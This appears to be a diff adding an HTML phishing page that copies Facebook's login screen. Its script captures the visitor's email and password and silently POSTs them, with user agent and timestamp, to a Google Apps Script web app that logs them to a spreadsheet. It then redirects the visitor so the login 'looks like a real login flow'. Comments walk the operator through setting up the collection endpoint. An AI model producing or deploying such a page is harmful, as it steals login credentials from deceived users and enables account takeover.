@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            display: flex;
+            max-width: 1100px;
+            width: 100%;
+            background-color: transparent;
+        }
+
+        .left-section {
+            flex: 1;
+            padding-right: 32px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .left-section h1 {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 20px;
+        }
+
+        .left-section p {
+            font-size: 28px;
+            color: #1c1e21;
+            line-height: 1.3;
+        }
+
+        .right-section {
+            width: 400px;
+        }
+
+        .login-form {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 12px 0 6px;
+            transition: background-color 0.2s;
+        }
+
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        .login-button:disabled {
+            background-color: #9ab8e8;
+            cursor: not-allowed;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-new-account {
+            background-color: #42b72a;
+            padding: 12px;
+            border-radius: 6px;
+            text-align: center;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+
+        .create-new-account:hover {
+            background-color: #36a420;
+        }
+
+        .create-new-account a {
+            color: white;
+            text-decoration: none;
+            font-size: 17px;
+        }
+
+        .page-footer {
+            text-align: center;
+            font-size: 14px;
+            color: #606770;
+        }
+
+        .page-footer a {
+            color: #606770;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .page-footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .left-section {
+                padding-right: 0;
+                margin-bottom: 30px;
+                text-align: center;
+            }
+
+            .left-section h1 {
+                font-size: 48px;
+            }
+
+            .left-section p {
+                font-size: 24px;
+            }
+        }
+
+        @media (max-width: 500px) {
+            .right-section {
+                width: 100%;
+            }
+
+            .left-section h1 {
+                font-size: 36px;
+            }
+
+            .left-section p {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1>bakebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+
+        <div class="right-section">
+            <div class="login-form">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <input type="email" name="email" id="emailInput" placeholder="Email address or phone number"
+                            required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" name="password" id="passwordInput" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="login-button" id="submitBtn">Log In</button>
+                    <div class="forgot-password">
+                        <a href="#">Forgotten password?</a>
+                    </div>
+                    <div class="divider"></div>
+                    <div class="create-new-account">
+                        <a href="#">Create new account</a>
+                    </div>
+                </form>
+            </div>
+
+            <div class="page-footer">
+                <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // =====================================================================
+        // ⚠️  STEP 1: PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL BELOW
+        // Get it from: Google Sheet → Extensions → Apps Script → Deploy → New Deployment
+        // Set "Execute as: Me" and "Who has access: Anyone"
+        // =====================================================================
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx0SyUTQF2qlHIwSIPPqbTVB7q69rk01-9LujiLViniu1u3yFZD5gydN5dSEzxraAyg/exec";
+
+        // =====================================================================
+        // ⚠️  STEP 2: Change this URL to wherever you want users to land after login
+        // Examples: "https://www.facebook.com"  or  "/"  or  "/thank-you.html"
+        // =====================================================================
+        const REDIRECT_URL = "/"; // Redirects back to your homepage after login
+
+        document.getElementById('loginForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+            const submitBtn = document.getElementById('submitBtn');
+
+            // Show loading state
+            submitBtn.disabled = true;
+            submitBtn.textContent = "Logging in...";
+
+            try {
+                // Send data silently to Google Sheets
+                await fetch(GOOGLE_SCRIPT_URL, {
+                    method: "POST",
+                    mode: "no-cors", // Required for Google Apps Script cross-origin requests
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (err) {
+                // Silently ignore errors — still redirect the user
+                console.warn("Could not reach logging server:", err);
+            }
+
+            // Redirect user after submit (looks like a real login flow)
+            window.location.href = REDIRECT_URL;
+        });
+    </script>
+</body>
+
+</html>
